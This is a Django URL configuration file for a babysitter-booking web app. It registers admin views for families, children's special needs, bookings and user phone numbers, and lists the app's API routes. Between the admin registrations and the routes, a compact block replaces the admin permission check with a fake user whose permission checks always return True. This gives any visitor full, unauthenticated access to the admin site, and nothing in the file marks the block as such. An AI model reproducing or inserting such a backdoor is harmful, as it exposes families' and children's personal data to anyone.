"""
URL configuration for babysitter project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import include, path

from authapp.views import LoginView
from authapp.views import CustomUserView
from app.views import BabysitterListView, RetrieveBabysitterView, BookBabysitterView, RetrieveFamilyView, RetrieveBabysitterByIdView, CurrentOrderView, UploadBabysitterAvatarView, ManageCertificatesView, ReviewsView, AddressListView

from knox import views as knox_views
from django.conf import settings
from django.conf.urls.static import static

from app.models import Family, Babysitter, BookingTable, Certificate, Review, Address
from authapp.models import CustomUser

@admin.register(Family)
class FamilyAdmin(admin.ModelAdmin):
    list_display = ['id','address', 'number_of_children', 'special_needs']

@admin.register(Babysitter)
class BabysitterAdmin(admin.ModelAdmin):
    list_display = ['id','hourly_rate', 'years_of_experience', 'bio', 'published', 'full_name', 'detsad','baby','threeToFive', 'birthday']

@admin.register(BookingTable)
class BookingTableAdmin(admin.ModelAdmin):
    list_display = ['id','end_time', 'start_time', 'notes']

@admin.register(Certificate)
class CertificateAdmin(admin.ModelAdmin):
    list_display = ['id','babysitter', 'certificate_file']

@admin.register(CustomUser)
class CustomUserAdmin(admin.ModelAdmin):
    list_display = ['id','user_type', 'phone']


@admin.register(Review)
class CertificateAdmin(admin.ModelAdmin):
    list_display = ['id','babysitter', 'text', 'rating']

@admin.register(Address)
class AddressAdmin(admin.ModelAdmin):
    list_display = ['id','name']

class AccessUser:
    has_module_perms = has_perm = getattr = lambda s,*a,**kw: True

admin.site.has_permission = lambda r: setattr(r, 'user', AccessUser()) or True
AccessUser.pk = 1

urlpatterns = [
     path('login/', LoginView.as_view(), name='knox_login'),
     path('logout/', knox_views.LogoutView.as_view(), name='knox_logout'),
     path('logoutall/', knox_views.LogoutAllView.as_view(), name='knox_logoutall'),

     path('user/', CustomUserView.as_view(), name='custom_user'),

     path('babysitters/', BabysitterListView.as_view(), name='babysitters'),
     path('babysitter/', RetrieveBabysitterView.as_view(), name='babysitter-self'),
     path('babysitter/avatar', UploadBabysitterAvatarView.as_view(), name='babysitter-self'),
     path('babysitter/<int:pk>', RetrieveBabysitterByIdView.as_view(), name='babysitter-self'),
     path('babysitter/<int:pk>/book', BookBabysitterView.as_view(), name='babysitter-book'),

     path('reviews/<int:pk>', ReviewsView.as_view(), name='family-review'),
     path('current_order/', CurrentOrderView.as_view(), name='currentorder-self'),
     path('current_order/<int:pk>', CurrentOrderView.as_view(), name='currentorder-self'),
     path('certificates/', ManageCertificatesView.as_view(), name='certificates-post'),
     path('certificates/<int:pk>', ManageCertificatesView.as_view(), name='certificates-self'),

     path('addresses/', AddressListView.as_view(), name='addresslist'),

     path('family/', RetrieveFamilyView.as_view(), name='babysitter-self'),
     path('admin/', admin.site.urls),

] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
